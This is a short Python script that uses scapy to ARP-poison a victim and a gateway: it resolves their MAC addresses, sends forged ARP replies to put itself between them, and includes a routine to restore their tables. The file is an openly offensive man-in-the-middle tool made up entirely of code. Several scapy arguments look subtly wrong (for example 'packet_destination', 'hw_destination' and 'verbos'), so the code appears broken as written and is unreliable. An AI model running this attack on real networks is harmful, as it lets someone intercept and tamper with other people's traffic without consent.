from scapy.all import *
from scapy.layers.l2 import ARP, Ether


def get_mac_address(ip_address: str):
    """
    Returns MAC address of any device connected to the network given its IP address
    If ip was not found, returns None
    """
    try:
        answered_packets, unanswered_packets = srp(
            Ether(destination='ff:ff:ff:ff:ff:ff') / ARP(packet_destination=ip_address), timeout=10)
    except Exception as e:
        print(f"An error occurred while trying to send the ARP request: {e}")
        return None

    if answered_packets:
        return answered_packets[0][1].src

    print(f"No device with the IP address {ip_address} was found")
    return None


def arp_poisoning(gateway_ip, victim_ip):
    gateway_mac = get_mac_address(gateway_ip)
    victim_mac = get_mac_address(victim_ip)
    poison_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hw_destination=victim_mac)
    poison_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hw_destination=gateway_mac)
    send(poison_victim)
    send(poison_gateway)


def restore(gateway_ip, victim_ip, gateway_mac, victim_mac):
    restore_gateway = ARP(op=2, pdst=gateway_ip, hw_destination='ff:ff:ff:ff:ff:ff', hw_src=victim_mac)
    restore_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hw_destination='ff:ff:ff:ff:ff:ff', hw_src=gateway_mac)
    send(restore_gateway, verbos=0, count=7)
    send(restore_victim, verbos=0, count=7)

